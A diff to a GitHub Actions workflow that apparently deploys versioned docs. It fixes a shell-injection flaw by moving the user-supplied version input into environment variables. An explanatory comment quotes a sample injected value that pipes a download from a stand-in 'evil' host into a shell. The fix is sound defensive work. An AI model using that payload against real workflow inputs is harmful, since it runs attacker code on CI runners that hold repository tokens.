@@ -90,10 +90,18 @@ jobs:
           fi
           mv site-main site
 
+      # github.event.inputs.version is a workflow_dispatch input: text a user
+      # types, interpolated by the expression engine BEFORE the shell sees the
+      # script, so `"; curl evil | sh; #` would run on the runner with this
+      # job's token. Semgrep's run-shell-injection rule is right. Through env:
+      # the value arrives as data the shell reads, not as script text.
       - name: Deploy with mike (versioning)
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          INPUT_VERSION: ${{ github.event.inputs.version }}
         run: |
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            VERSION="${{ github.event.inputs.version }}"
+          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
+            VERSION="$INPUT_VERSION"
           else
             # Extract version from git tag or use 'latest'
             VERSION=$(git describe --tags --exact-match 2>/dev/null || echo "latest")
